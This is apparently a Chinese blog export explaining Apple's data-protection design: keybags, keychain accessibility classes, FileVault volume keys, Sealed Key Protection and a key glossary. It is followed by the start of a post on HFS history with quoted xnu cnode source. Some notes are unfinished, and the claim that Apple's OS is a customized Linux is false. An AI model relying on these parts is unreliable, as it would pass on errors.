那么不管备份文件属于哪一种数据保护类， 备份文件都不加密，但钥匙串仍使用 UID 派生密钥获得保护。这就是只有设置备份密码才能将钥匙串项迁移到新设备的原因。</p>\n<h3 id=\"4-托管密钥包（Escrow-keybag）\"><a href=\"#4-托管密钥包（Escrow-keybag）\" class=\"headerlink\" title=\"4. 托管密钥包（Escrow keybag）\"></a>4. 托管密钥包（Escrow keybag）</h3><p>托管密钥包用于通过 USB 与 “访达” (macOS 10.15 或更高版本) 或 iTunes (macOS 10.14 或更低版 本) 进行同步， 还用于移动设备管理 (MDM)。 此密钥包允许 “访达” 或 iTunes 执行备份和同步， 而无需用户输入密码，它还允许 MDM 解决方案远程清除用户密码。它储存在用于与 “访达” 或 iTunes 进行同步的电脑上，或者在远程管理设备的 MDM 解决方案上。<br>托管密钥包改善了设备同步过程中的用户体验，期间可能需要访问所有类别的数据。当使用密码锁定的设备首次连接到 “访达” 或 iTunes 时，会提示用户输入密码。然后设备创建托管密钥包，其中包含的类密钥与设备上使用的完全相同，该密钥包由新生成的密钥进行保护。托管密钥包及用于保护它的密钥划分到设备和主机或服务器上，其数据以 “首次用户认证前保护” 类储存在设备上。这就是重新启动后，用户首次使用 “访达” 或 iTunes 进行备份之前必须输入设备密码的原因。</p>\n<h3 id=\"5-云备份密钥包（iCloud-Backup-keybag）\"><a href=\"#5-云备份密钥包（iCloud-Backup-keybag）\" class=\"headerlink\" title=\"5.云备份密钥包（iCloud Backup keybag）\"></a>5.云备份密钥包（iCloud Backup keybag）</h3><p>iCloud 云备份密钥包与备份密钥包类似。 该密钥包中的所有类密钥都是非对称的 (与 “未打开文件的保护”数据保护类一样， 使用 Curve25519)。<br>非对称密钥包还可用于 “iCloud 钥匙串” 钥匙串恢复中的备份。</p>\n<h2 id=\"四、钥匙串-Key-Chain-数据保护\"><a href=\"#四、钥匙串-Key-Chain-数据保护\" class=\"headerlink\" title=\"四、钥匙串 (Key Chain)数据保护\"></a>四、钥匙串 (Key Chain)数据保护</h2><p>许多 App 都需要处理密码和其他一些简短但比较敏感的数据，如密钥和登录令牌。钥匙串提供了储存这些项的安全方式。不同的 Apple 操作系统采用不同机制实施与各钥匙串保护类关联的保障。<br>在 macOS (包括搭 载 Apple 芯片的 Mac) 中，数据保护不直接用于实施此类保障。</p>\n<p>钥匙串项使用两种不同的 AES-256-GCM 密钥加密 : 表格密钥 (元数据) 和行独有密钥 (私密密钥)。钥匙串元数据 (除 kSecValue 外的所有属性) 使用元数据密钥加密以加速搜索，私密值 (kSecValueData) 使用私密密钥进行加密。元数据密钥受安全隔区保护，但会缓存在应用程序处理器中以便进行钥匙串快速查询。私密密钥则始终需要通过安全隔区进行往返处理。</p>\n<blockquote>\n<p>元数据密钥就是 FileSystem Key（EMF），私密密钥就是 Passcode Key</p>\n</blockquote>\n<p>钥匙串以储存在文件系统中的<code>SQLite</code>数据库的形式实现， 而且数据库只有一个<code>securityd</code>监控程序决定每个进程或 App 可以访问哪些钥匙串项。钥匙串访问 API 将生成对监控程序的调用，从而查询 App 的 “keychain-access-groups”、 “application-identifier” 和 “application-group” 权限。访问组允许在 App 之间共享钥匙串项，而非将访问权限限制于单个进程。</p>\n<h3 id=\"1-类型定义\"><a href=\"#1-类型定义\" class=\"headerlink\" title=\"1. 类型定义\"></a>1. 类型定义</h3><p>根据 Apple 最新的 <a href=\"https://developer.apple.com/documentation/security/ksecattraccessiblewhenunlockedthisdeviceonly\">KeyChain 的开发技术文档</a>，当前提供如下类型：</p>\n<p>对应文件保护的类型定义：</p>\n<ul>\n<li>kSecAttrAccessibleAfterFirstUnlock: 首次解锁后，对应文件保护的 Class C</li>\n<li>kSecAttrAccessibleWhenUnlocked: 未锁定状态下，对应文件保护的 Class A</li>\n<li>kSecAttrAccessibleAlways: <strong>iOS 13 已弃用</strong>。始终，对应文件保护的 Class D</li>\n</ul>\n<blockquote>\n<p>使用后台刷新服务的 App 可通过 kSecAttrAccessibleAfterFirstUnlock 访问需要的钥匙串项</p>\n</blockquote>\n<p>钥匙串类都有对应的 “仅限本设备” 项目，后者在备份期间从设备拷贝时始终通过 UID 加以保护，如果恢复（迁移）至其他设备将无法使用，例如 VPN 证书。</p>\n<ul>\n<li>kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly: 仅限本设备，首次解锁后</li>\n<li>kSecAttrAccessibleWhenUnlockedThisDeviceOnly: 仅限本设备，未锁定状态下</li>\n<li>kSecAttrAccessibleAlwaysThisDeviceOnly: <strong>iOS 13 已弃用</strong>。仅限本设备，始终</li>\n</ul>\n<p>还有一个仅存在于系统密钥包的特殊类型，一旦用户密码被移除或重设，该类密钥便会丢弃，且不会备份、不同步到 iCloud 钥匙串、不包括在托管密钥包。</p>\n<ul>\n<li>kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly：仅当设备配置了密码时可用，行为方式与“未锁定状态下”相同</li>\n</ul>\n<h3 id=\"2-典型场景\"><a href=\"#2-典型场景\" class=\"headerlink\" title=\"2. 典型场景\"></a>2. 典型场景</h3><p>Apple 根据所保护信息的类型以及 iOS 和 iPadOS 需要这些信息的时间来选择钥匙串类，妥善平衡了安全性和可用性。例如，VPN 证书必须始终可用，这样设备才能保持连接，但它归类为 “不可迁移”， 因此不能将其移至另一台设备.</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Item</th>\n<th align=\"center\">Accessibility</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Wi-Fi passwords</td>\n<td align=\"center\">Always</td>\n</tr>\n<tr>\n<td align=\"center\">IMAP&#x2F;POP&#x2F;SMTP accounts</td>\n<td align=\"center\">AfterFirstUnlock</td>\n</tr>\n<tr>\n<td align=\"center\">Exchange accounts</td>\n<td align=\"center\">Always</td>\n</tr>\n<tr>\n<td align=\"center\">VPN</td>\n<td align=\"center\">Always</td>\n</tr>\n<tr>\n<td align=\"center\">LDAP&#x2F;CalDAV&#x2F;CardDAV accounts</td>\n<td align=\"center\">Always</td>\n</tr>\n<tr>\n<td align=\"center\">iTunes backup password</td>\n<td align=\"center\">WhenUnlockedThisDeviceOnly</td>\n</tr>\n<tr>\n<td align=\"center\">Device certificate &amp; private key</td>\n<td align=\"center\">AlwaysThisDeviceOnly</td>\n</tr>\n</tbody></table>\n<h2 id=\"五、文件保管箱（FileVault）\"><a href=\"#五、文件保管箱（FileVault）\" class=\"headerlink\" title=\"五、文件保管箱（FileVault）\"></a>五、文件保管箱（FileVault）</h2><blockquote>\n<p>On Apple devices that support Data Protection, the key encryption key (KEK) is protected (or sealed) with measurements of the software on the system, as well as being tied to the UID available only from the Secure Enclave.<br>On a Mac with Apple silicon, the protection of the KEK is further strengthened by incorporating information about security policy on the system, because macOS supports critical security policy changes (for example, disabling secure boot or SIP) that are unsupported on other platforms.<br>On a Mac with Apple silicon, this protection encompass FileVault keys, because FileVault is implemented using Data Protection (Class C).<br>The key that results from entangling the user password, long-term SKP key, and Hardware key 1 (the UID from Secure Enclave) is called the password-derived key.<br>This key is used to protect the user keybag (on all supported platforms) and <strong>KEK (in macOS only)</strong>, and then enable biometric unlock or auto unlock with other devices such as Apple Watch.</p>\n</blockquote>\n<p>MacOS 使用文件保险箱（FileVault）技术提供数据保护功能，使用 AES-XTS 数据加密算法保护内部和可移除储存设备上的完整宗卷。</p>\n<blockquote>\n<p>xART Key 是反重放密钥，SKP、KEK ？？？</p>\n</blockquote>\n<p>数据宗卷文件系统中所有文件的元数据都使用随机宗卷密钥（<code>Volume Key</code>）进行加密，该密钥在首次安装操作系统或用户擦除设备时创建。此密钥由密钥封装密钥（<code>Key Encryption Key</code>）加密和封装，<strong>密钥封装密钥由安全隔区长期储存，只在安全隔区中可见</strong>。每次用户抹掉设备时，它都会发生变化。在 A9（及后续型号）SoC 上，安全隔区依靠由反重放系统支持的熵来实现可擦除性，以及保护其他资源中的密钥封装密钥。</p>\n<blockquote>\n<p>Volume Key 负责加密 volume 和文件 metadata，其作用与 iOS 的 FileSystem Key 相同，但加密和存储方式存在显著差异：<br>iOS 中，FileSystem Key 的密文是 EMF，持久化存储在 NAND 可擦除区域；而 MacOS 将</p>\n</blockquote>\n<p>在搭载 Apple 芯片的 Mac 上，数据保护默认为 C 类，但<strong>使用宗卷密钥，而非范围独有密钥或文件独有密钥</strong>，可为用户数据高效重建文件保险箱安全模型。用户仍须选择使用文件保险箱，以获得加密密钥层级搭配用户密码的全面保护。开发者也可以选择使用文件独有密钥或范围独有密钥的更高保护类。</p>\n<blockquote>\n<p>APFS 支持文件克隆（使用写入时拷贝技术的零损耗拷贝），如果文件被克隆，克隆的每一半都会得到一个新的密钥以接受传入的数据写入，这样新数据会使用新密钥写入媒介。久而久之， 文件可能会由不同的范围（或片段）组成，每个映射到不同的密钥（称为范围密钥，<code>Per-extend Key</code>）。<br>但是，组成文件的所有范围密钥仍然受同一 Class key 的保护。</p>\n</blockquote>\n<p>搭载 Apple 芯片的 Mac 上的文件保险箱通过使用宗卷密钥的数据保护 C 类来实施。<br>在搭载 Apple T2 安 全芯片的 Mac 和搭载 Apple 芯片的 Mac 上， 直接连接到安全隔区的加密内部储存设备会使用安全隔区的硬件安全性功能和 AES 引擎的功能。<br>用户在 Mac 上启用文件保险箱后，启动过程中将需要其凭证。</p>\n<h3 id=\"1-文件保险箱已打开的内部储存设备\"><a href=\"#1-文件保险箱已打开的内部储存设备\" class=\"headerlink\" title=\"1. 文件保险箱已打开的内部储存设备\"></a>1. 文件保险箱已打开的内部储存设备</h3><p>如果没有有效的登录凭证或加密恢复密钥，即使物理储存设备被移除并连接到其他电脑，内置 APFS 宗卷仍保持加密状态，以防止未经授权的访问。在 macOS 10.15 中，此类宗卷同时包括系统宗卷和数据宗卷。从 macOS 11 开始，系统宗卷通过签名系统宗卷 (SSV) 功能进行保护，而数据宗卷仍通过加密进行保护。搭载 Apple 芯片的 Mac 以及搭载 T2 芯片的 Mac 通过构建和管理密钥层级实施内部宗卷加密，基于芯片内建的硬件加密技术而构建。<br><img src=\"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84/filevault-on.png\" alt=\"filevault-on\"></p>\n<p>此密钥层级的设计旨在同时实现四个目标 :<br>• 请求用户密码用于加密<br>• 保护系统免受针对从 Mac 上移除的储存媒介的直接暴力破解攻击<br>• 提供擦除内容的快速安全的方法， 即通过删除必要的加密材料<br>• 让用户无需重新加密整个宗卷即可更改其密码 (同时也会更改用于保护其文件的加密密钥)</p>\n<p>在搭载 Apple 芯片的 Mac 以及搭载 T2 芯片的 Mac 上，所有文件保险箱密钥的处理都发生在安全隔区中；加密密钥绝不会直接透露给 Intel CPU。 所有 APFS 宗卷默认使用宗卷加密密钥创建。宗卷和元数据内容使用此宗卷加密密钥加密，此宗卷加密密钥使用<strong>类密钥</strong>封装。 文件保险箱启用时，类密钥受用户密码和硬件 UID 共同保护。</p>\n<h3 id=\"2-文件保险箱已关闭的内部储存设备\"><a href=\"#2-文件保险箱已关闭的内部储存设备\" class=\"headerlink\" title=\"2. 文件保险箱已关闭的内部储存设备\"></a>2. 文件保险箱已关闭的内部储存设备</h3><p>在搭载 Apple 芯片或搭载 T2 芯片的 Mac 上，如果在 “设置助理” 初次运行过程中未启用文件保险箱，宗卷仍会加密，但宗卷加密密钥仅由安全隔区中的硬件 UID 保护。<br><img src=\"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84/filevault-off.png\" alt=\"filevault-off\"></p>\n<p>如果稍后启用了文件保险箱 (由于数据已加密， 该过程可立即完成)， 反重放机制会帮助阻止旧密钥 (仅基于硬件 UID) 被用于解密宗卷。 然后宗卷将受用户密码和硬件 UID 共同保护 (如前文所述)。</p>\n<h3 id=\"3-删除文件保险箱宗卷\"><a href=\"#3-删除文件保险箱宗卷\" class=\"headerlink\" title=\"3. 删除文件保险箱宗卷\"></a>3. 删除文件保险箱宗卷</h3><p>删除宗卷时，其宗卷加密密钥由安全隔区安全删除。这有助于防止以后使用此密钥进行访问 (即使是通过安全 隔区)。另外，所有宗卷加密密钥都使用媒介密钥封装。媒介密钥不提供额外的数据机密性，而是旨在启用快 速安全的数据删除，如果缺少了它，则不可能进行解密。<br>在搭载 Apple 芯片的 Mac 和搭载 T2 芯片的 Mac 上，媒介密钥一定是由受安全隔区支持的技术来抹掉，例如远程 MDM 命令。以这种方式抹掉媒介密钥将导致宗卷因存在加密而不可访问。</p>\n<h3 id=\"4-可移除储存设备\"><a href=\"#4-可移除储存设备\" class=\"headerlink\" title=\"4. 可移除储存设备\"></a>4. 可移除储存设备</h3><p>可移除储存设备的加密不使用安全隔区的安全性功能，而是采用与基于 Intel 的 Mac (不搭载 T2 芯片) 相同的方式执行加密。</p>\n<h2 id=\"六、技术分析\"><a href=\"#六、技术分析\" class=\"headerlink\" title=\"六、技术分析\"></a>六、技术分析</h2><h3 id=\"1-SKP-密封密钥保护技术\"><a href=\"#1-SKP-密封密钥保护技术\" class=\"headerlink\" title=\"1. SKP 密封密钥保护技术\"></a>1. SKP 密封密钥保护技术</h3><p>Apple 设备支持一项称为密封密钥保护 (SKP，Sealed Key Prtection) 的技术， 其旨在确保加密材料在这些情况下不可用 : 脱离设备 时， 或者对操作系统版本或安全性设置存在未经用户正确授权的操纵时。</p>\n<p>注意！SKP 功能不是由安全隔区提供，而是由位于更底层的硬件寄存器支持（也就意味着，仅在搭载 Apple 设计的 SoC 的设备上提供），目的是针对解密用户数据所需的密钥提供独立于安全隔区的额外保护层。</p>\n<p><img src=\"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84/SKP.png\" alt=\"SKP\"></p>\n<p>安全隔区启动监视器会捕获所加载的安全隔区操作系统的测量值。 当应用程序处理器 Boot ROM 测量附于 LLB 的 Image4 清单时， 该清单也包含所有其他已加载的系统配对固件的测量值。 LocalPolicy </p>\n<ul>\n<li>安全隔区固件 sepOS ：由安全隔区启动监视器（硬件实现）获取测量值</li>\n<li>LLB Image4 manifest：包含所有与 macOS 配对的固件和 macOS 核心启动对象 (如启动内核集或签名系统宗卷 (SSV) 根哈希值)的测量值</li>\n<li>本地安全策略 LocalPolicy 的测量值：包含已加载 macOS 的核心安全性配置。 还包含 nsih 字段， 它是 macOS Image4 清单的哈希值。</li>\n</ul>\n<p><img src=\"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84/mac-boot.png\" alt=\"搭载 Apple 芯片的 Mac 开机时的启动过程步骤\"></p>\n<p>如果攻击者能够意外地更改任何上述测量的固件、 软件或安全性配置组件， 则也会修改储存在硬件寄存器中的测量值。 测量值的修改会导致从加密硬件派生的系统测量根密钥 (SMRK) 派生出不同的值， 从而有效破坏密钥层 级的封章。 这将导致无法访问系统测量设备密钥 (SMDK)， 从而导致无法访问 KEK， 因此也无法访问数据。</p>\n<p>但是， 系统在未受到攻击时， 必须容纳合法的软件更新， 这些更新会更改固件测量值和 LocalPolicy 中的 nsih 字段， 以指向新的 macOS 测量值。 在其他尝试整合固件测量值但没有已知真实来源的系统中， 用 户将被要求停用安全性， 更新固件后重新启用安全性， 以便捕获新的测量基线。 这大大增加了攻击者在软件 更新期间篡改固件的风险。 Image4 清单包含所需的所有测量值， 这对系统很有帮助。 正常启动期间如果测 量值匹配， 使用 SMRK 解密 SMDK 的硬件也可以将 SMDK 加密为所建议的将来的 SMRK。 通过指定软 件更新后预期的测量值， 硬件可以加密在当前操作系统中可访问的 SMDK， 以便在将来的操作系统中仍可 访问。 同样地， 当客户在 LocalPolicy 中合法更改其安全性设置时， 必须根据 LLB 下次重新启动时计算的 LocalPolicy 测量值， 将 SMDK 加密为将来的 SMRK。</p>\n<blockquote>\n<p>Image4 是经 ASN.1（抽象语法标记一）DER 编码的数据结构格式，用于描述 Apple 平台上有关安全启动链对象的信息。</p>\n</blockquote>\n<h3 id=\"2-关于-iOS-的文件保护类型\"><a href=\"#2-关于-iOS-的文件保护类型\" class=\"headerlink\" title=\"2. 关于 iOS 的文件保护类型\"></a>2. 关于 iOS 的文件保护类型</h3><p>对于早期的 iOS 系统，Class D 是用户数据文件的默认类型，其类密钥是 DKey。也就是说，尽管每个文件都有 per-file key，但是这些文件专有密钥的包裹密钥都是 DKey，而 DKey 并未将 Passcode 作为加密因子（仅由基于 UID 的 Key 0x835 提供保护），因此其加密强度难以抵抗暴力破解。</p>\n<p>从 iOS 5 开始，Apple 决定将 Class C 作为默认类型，即在设备开机时，校验用户输入的 passcode，成功后即可自由访问（即使发生了锁屏事件，仍然可以访问数据文件）；但是如果设备关机，就必须在开机之后重新校验 passcode。</p>\n<p>Class A 主要适用于日历、信息、邮件、照片、通讯录和健康数据等个人敏感信息，其特点是一旦锁屏事件发生（延迟10秒），将丢弃内存中的类密钥，结果是无法访问数据文件了；只有用户重新输入 passcode 解锁屏幕后，再重新计算类密钥，才可以继续提供数据文件访问。</p>\n<p>Class B 的设计目标是解决远程下载等互联网服务的后台权限问题，方法是采用 ECC 非对称密码系统，代价是文件元数据需要额外存储一个临时公钥（类密钥就是静态私钥）</p>\n<h3 id=\"2-关于-MacOS-的-Volume-Key\"><a href=\"#2-关于-MacOS-的-Volume-Key\" class=\"headerlink\" title=\"2. 关于 MacOS 的 Volume Key\"></a>2. 关于 MacOS 的 Volume Key</h3><p>MacOS 使用的 FileVault 技术与 iOS 使用的 Data Protection 存在一些差异，主要体现在：</p>\n<ol>\n<li>不支持 Class D 保护类型，也就是说，没有 <code>DKey</code> 密钥；</li>\n<li>Class C 是默认类型，但并非每个文件都有不同的 per-file key，而是所有文件内容使用统一的卷宗密钥（<code>Volume Key</code>）;</li>\n<li></li>\n</ol>\n<h3 id=\"4-遗留问题\"><a href=\"#4-遗留问题\" class=\"headerlink\" title=\"4. 遗留问题\"></a>4. 遗留问题</h3><ol>\n<li>用户修改passcode后，需要重新封装metadata中所有的per-file key，似乎计算量也不小啊！</li>\n</ol>\n<h2 id=\"名词解释\"><a href=\"#名词解释\" class=\"headerlink\" title=\"名词解释\"></a>名词解释</h2><h3 id=\"Effaceable-Storage，可擦除区域\"><a href=\"#Effaceable-Storage，可擦除区域\" class=\"headerlink\" title=\"Effaceable Storage，可擦除区域\"></a>Effaceable Storage，可擦除区域</h3><p>可擦除存储器 NAND 存储器中一个用于储存加密密钥的专用区域，可被直接寻址和安全擦除。尽管当攻击者实际占有设备时，可擦除存储器无法提供保护，但其中存储的密钥可用作密钥层级的一部分，用于实现快速擦 除和前向安全性。</p>\n<h3 id=\"LLB-Low-Level-Bootloader，底层引导载入程序\"><a href=\"#LLB-Low-Level-Bootloader，底层引导载入程序\" class=\"headerlink\" title=\"LLB - Low Level Bootloader，底层引导载入程序\"></a>LLB - Low Level Bootloader，底层引导载入程序</h3><p>在具有两步启动架构的 Mac 电脑上，LLB 包含由 Boot ROM 调用的代码，该代码随后会载入 iBoot，成为安全启动链的一环。</p>\n<h3 id=\"xART-eXtended-Anti-Replay-Technology，反重放技术\"><a href=\"#xART-eXtended-Anti-Replay-Technology，反重放技术\" class=\"headerlink\" title=\"xART - eXtended Anti-Replay Technology，反重放技术\"></a>xART - eXtended Anti-Replay Technology，反重放技术</h3><p>一组为具有反重放功能 (基于物理储存架构) 的安全隔区提供加密且经认证的永久储存区的服务。</p>\n<h3 id=\"3-核心密钥类型\"><a href=\"#3-核心密钥类型\" class=\"headerlink\" title=\"3. 核心密钥类型\"></a>3. 核心密钥类型</h3><h3 id=\"UID-unique-ID，唯一ID\"><a href=\"#UID-unique-ID，唯一ID\" class=\"headerlink\" title=\"UID - unique ID，唯一ID\"></a>UID - unique ID，唯一ID</h3><p>UID 是一个 256 位的 AES 密钥，在设备制造过程中刻录在每个处理器上。<br>这种密钥无法由固件或软件读取，只能由处理器的硬件 AES 引擎使用。 若要获取实际密钥，攻击者必须对处理器的芯片发起极为复杂且代价高昂的物理攻击。 UID 与设备上的任何其他标识符均无关，包括但不限于 UDID。</p>\n<h4 id=\"PDK-Passcode-Derived-Key，密码派生密钥\"><a href=\"#PDK-Passcode-Derived-Key，密码派生密钥\" class=\"headerlink\" title=\"PDK - Passcode-Derived Key，密码派生密钥\"></a>PDK - Passcode-Derived Key，密码派生密钥</h4><p>用户密码与长期 SKP 密钥和安全隔区的 UID 配合使用，由此派生加密密钥。</p>\n<h4 id=\"per-file-key，文件独有密钥\"><a href=\"#per-file-key，文件独有密钥\" class=\"headerlink\" title=\"per-file key，文件独有密钥\"></a>per-file key，文件独有密钥</h4><p>数据保护用于在文件系统上加密文件的密钥。文件独有密钥使用类密钥封装，储存在文件的元数据 metadata 中。</p>\n<h4 id=\"filesystem-key，文件系统密钥\"><a href=\"#filesystem-key，文件系统密钥\" class=\"headerlink\" title=\"filesystem key，文件系统密钥\"></a>filesystem key，文件系统密钥</h4><p>用于加密每个文件的元数据的密钥，包括其类密钥。存储在可擦除存储器中，用于实现快速擦除，并非用于保密目的。</p>\n<h4 id=\"Volume-Key，卷宗密钥\"><a href=\"#Volume-Key，卷宗密钥\" class=\"headerlink\" title=\"Volume Key，卷宗密钥\"></a>Volume Key，卷宗密钥</h4><p>数据宗卷文件系统中所有文件的元数据都使用随机宗卷密钥（Volume Key）进行加密，该密钥在首次安装操作系统或用户擦除设备时创建。</p>\n<h4 id=\"KEK-Key-Encryption-Key，密钥封装密钥\"><a href=\"#KEK-Key-Encryption-Key，密钥封装密钥\" class=\"headerlink\" title=\"KEK - Key Encryption Key，密钥封装密钥\"></a>KEK - Key Encryption Key，密钥封装密钥</h4><p>宗卷密钥密钥由密钥封装密钥（Key Encryption Key）加密和封装，密钥封装密钥由安全隔区长期储存，只在安全隔区中可见。每次用户抹掉设备时，它都会发生变化。在 A9（及后续型号） SoC 上，安全隔区依靠由反重放系统支持的熵来实现可擦除性，以及保护其他资源中的密钥封装密钥。</p>\n<blockquote>\n<p>从功能描述上看，KEK 就是 PDK ！！！</p>\n</blockquote>\n<hr>\n<h2 id=\"Apple官方文档\"><a href=\"#Apple官方文档\" class=\"headerlink\" title=\"Apple官方文档\"></a>Apple官方文档</h2><ul>\n<li><a href=\"apple-platform-security-guide.pdf\">Apple 平台安全白皮书 - 2022年英文版</a></li>\n<li><a href=\"apple%E5%B9%B3%E5%8F%B0%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-2021%E4%B8%AD%E6%96%87%E7%89%88.pdf\">Apple 平台安全白皮书 - 2021年中文版</a></li>\n<li><a href=\"iOS%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-2018%E8%8B%B1%E6%96%87%E7%89%88.pdf\">iOS 安全白皮书 - 2018年英文版</a></li>\n<li><a href=\"Apple_T2_Security_Chip_Overview.pdf\">Apple T2 安全芯片概览</a></li>\n<li><a href=\"Apple-File-System-Reference.pdf\">APFS 文件系统参考手册</a></li>\n</ul>\n"},{"title":"Apple数据保护技术专题之三：代码实现","url":"/2022/11/13/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/","content":"<p>Apple 起家的产品是个人电脑，操作系统是基于 BSD 的定制化Linux，使用的是 MFS 文件系统。</p>\n<p>1985年，Apple 发布了 HFS（Hierarchical File System）作为专用的文件系统，后续改进推出了 HFS+（扩展日志式）。HFS 的设计理念源自软盘和磁盘设备时代，为此饱受开发者吐槽，甚至被 Linus 痛斥为有史以来最烂的文件系统，突出的问题有以下几个方面：</p>\n<ul>\n<li>大小写不敏感（最新版本已支持大小写敏感，但默认配置仍未不敏感）</li>\n<li>不支持对数据内容进行 checksum 校验</li>\n<li>timestamp 只支持到秒级</li>\n<li>不支持并发访问，不支持快照，不支持 sparse file</li>\n<li>使用 big-endian 进行存储</li>\n</ul>\n<p>2007年，乔布斯发布了第一代 iPhone，其搭载的操作系统称为 iOS，而个人电脑的操作系统被称为 MacOS。由于 iOS 其实是 MacOS 的一个定制化版本，HFS 只能提供类似 FDE 的全盘加密技术，无法在底层提供文件级别的数据加密能力，许多新功能只能基于上层文件的数据结构，以软件补丁的形式强行实现，开发效率和安全性存在严重隐患。</p>\n<blockquote>\n<p>对比 Android 系统，早期采用的<strong>FDE（Full-Disk Encryption）</strong>模式也是一种基于 Volume 的全盘加密技术；从 Android 7 开始，推出 <strong>FBE（File-based Encryption）</strong>模式可以支持文件级别的数据加密，但技术可靠性一直问题多多，直到 Android 13 才基本成熟并取消 FDE 模式的支持，这也从另一个角度说明数据保护技术的复杂性。</p>\n</blockquote>\n<p>2014年，在 Giampaolo 的带领下，Apple启动了APFS（Apple File System）项目研发，并于2017年首次发布，短板终于修补上了！APFS号称是针对SSD等新型设备专门设计（也兼容传统硬盘），提供Copy-on-Write、系统快照、动态分区调整、稀疏大文件支持等功能，但与业界最优秀的ZFS相比并无优势，唯一值得表扬的是，结合Apple封闭硬件体系的优势，执法机构再也没法提取iPhone 的个人数据了。</p>\n<p>需要注意的是，以下研究分析大多是基于 iOS 5 之前的版本，随着 iPhone 数据保护技术的多次演进，许多代码已经无法运行，但其技术原理是一脉相承的，仍然具备足够的参考价值。</p>\n<h2 id=\"一、文件系统的元数据-metadata\"><a href=\"#一、文件系统的元数据-metadata\" class=\"headerlink\" title=\"一、文件系统的元数据 - metadata\"></a>一、文件系统的元数据 - metadata</h2><p>所有 Linux 的文件系统都是 superblock , inode 和 block 的组合。</p>\n<ul>\n<li>superblock：记录此 filesystem 的整体信息,包括inode&#x2F;block的总量、使用量、剩余量, 以及文件系统的格式与相关信息等</li>\n<li>inode table：记录文件的权限与属性,一个文件占用一个inode,同时记录此文件的数据所在的 block 号码</li>\n<li>data block：实际记录文件的内容,若文件太大时,会占用多个 block</li>\n</ul>\n<h3 id=\"1-inode-的数据结构\"><a href=\"#1-inode-的数据结构\" class=\"headerlink\" title=\"1. inode 的数据结构\"></a>1. inode 的数据结构</h3><p>Apple 公开了操作系统的部分源代码，可以发现 HFS 仅仅是将 inode 改名为 cnode，但增加了一个 <code>c_cpentry</code> 字段用于数据保护。<br>请参见<a href=\"https://opensource.apple.com/source/xnu/xnu-1699.32.7/bsd/hfs/hfs_cnode.h\">https://opensource.apple.com/source/xnu/xnu-1699.32.7/bsd/hfs/hfs_cnode.h</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * The cnode is used to represent each active (or recently active)</span></span><br><span class=\"line\"><span class=\"comment\"> * file or directory in the HFS filesystem.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Reading or writing any of these fields requires holding c_lock.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cnode</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">lck_rw_t</span>        c_rwlock;               <span class=\"comment\">/* cnode&#x27;s lock */</span></span><br><span class=\"line\">    <span class=\"type\">void</span>            *c_lockowner;           <span class=\"comment\">/* cnode&#x27;s lock owner (exclusive case only) */</span></span><br><span class=\"line\">    <span class=\"type\">lck_rw_t</span>        c_truncatelock;         <span class=\"comment\">/* protects file from truncation during read/write */</span></span><br><span class=\"line\">    <span class=\"type\">void</span>            *c_truncatelockowner;   <span class=\"comment\">/* truncate lock owner (exclusive case only) */</span></span><br><span class=\"line\">    LIST_ENTRY(cnode)   c_hash;             <span class=\"comment\">/* cnode&#x27;s hash chain */</span></span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>       c_flag;                 <span class=\"comment\">/* cnode&#x27;s runtime flags */</span></span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>       c_hflag;                <span class=\"comment\">/* cnode&#x27;s flags for maintaining hash - protected by global hash lock */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vnode</span>    *<span class=\"title\">c_vp</span>;</span>                  <span class=\"comment\">/* vnode for data fork or dir */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vnode</span>    *<span class=\"title\">c_rsrc_vp</span>;</span>             <span class=\"comment\">/* vnode for resource fork */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">dquot</span>    *<span class=\"title\">c_dquot</span>[<span class=\"title\">MAXQUOTAS</span>];</span>    <span class=\"comment\">/* cnode&#x27;s quota info */</span></span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>       c_childhint;            <span class=\"comment\">/* catalog hint for children (small dirs only) */</span></span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>       c_dirthreadhint;        <span class=\"comment\">/* catalog hint for directory&#x27;s thread rec */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span 